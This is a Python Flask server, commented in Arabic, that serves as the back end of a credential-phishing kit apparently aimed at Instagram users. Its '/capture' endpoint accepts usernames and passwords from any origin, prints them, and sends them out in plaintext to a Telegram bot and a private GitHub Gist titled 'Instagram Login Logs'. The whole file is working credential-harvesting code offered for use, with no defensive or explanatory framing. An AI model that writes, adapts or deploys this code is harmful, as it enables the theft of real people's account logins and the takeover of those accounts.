from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # يسمح بطلبات من أي مصدر

# ====== إعدادات من متغيرات البيئة ======
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
GIST_ID = os.environ.get('GIST_ID', None)  # اختياري، إذا كان موجوداً يتم التحديث عليه

# ====== نقطة الاستقبال ======
@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        return '', 200

    try:
        data = request.json
        username = data.get('username', '')
        password = data.get('password', '')
        ua = data.get('userAgent', 'Unknown')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        print(f"[+] Received: {username} | {password}")

        # 1. إرسال إلى تلغرام
        msg = f"🔐 New Login\n👤 {username}\n🔑 {password}\n🕒 {timestamp}\n📱 {ua}"
        tg_ok = send_telegram(msg)
        print(f"[+] Telegram sent: {tg_ok}")

        # 2. تسجيل في GitHub Gist
        gist_ok = save_to_gist(username, password, timestamp, ua)
        print(f"[+] Gist saved: {gist_ok}")

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"[!] Error: {e}")
        return jsonify({"status": "error", "msg": str(e)}), 500

# ====== دالة إرسال تلغرام ======
def send_telegram(text):
    if not BOT_TOKEN or not CHAT_ID:
        print("[!] BOT_TOKEN or CHAT_ID missing")
        return False

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        resp = requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": text
        }, timeout=10)
        if resp.status_code == 200:
            return True
        else:
            print(f"[!] Telegram error: {resp.status_code} - {resp.text}")
            return False
    except Exception as e:
        print(f"[!] Telegram exception: {e}")
        return False

# ====== دالة حفظ في GitHub Gist ======
def save_to_gist(username, password, timestamp, ua):
    if not GITHUB_TOKEN:
        print("[!] GITHUB_TOKEN missing")
        return False

    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    log_entry = f"[{timestamp}] User: {username} | Pass: {password} | UA: {ua}\n"

    try:
        if GIST_ID:
            # تحديث Gist موجود
            url = f"https://api.github.com/gists/{GIST_ID}"
            resp = requests.get(url, headers=headers)
            if resp.status_code != 200:
                print(f"[!] Failed to fetch gist: {resp.status_code}")
                return False

            files = resp.json()['files']
            filename = list(files.keys())[0]
            old_content = files[filename]['content']
            new_content = old_content + log_entry

            update_resp = requests.patch(url, headers=headers, json={
                "files": {filename: {"content": new_content}}
            })
            return update_resp.status_code == 200
        else:
            # إنشاء Gist جديد
            data = {
                "description": "Instagram Login Logs",
                "public": False,
                "files": {"log.txt": {"content": log_entry}}
            }
            resp = requests.post("https://api.github.com/gists", headers=headers, json=data)
            if resp.status_code == 201:
                # حفظ الـ ID لاستخدامه لاحقاً
                new_id = resp.json()['id']
                print(f"[+] New Gist created: {new_id}")
                # ننصح بحفظه في متغير بيئة أو ملف
                return True
            else:
                print(f"[!] Gist creation error: {resp.status_code} - {resp.text}")
                return False
    except Exception as e:
        print(f"[!] Gist exception: {e}")
        return False

# ====== تشغيل الخادم ======
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"[*] Starting server on port {port}")
    app.run(host='0.0.0.0', port=port)
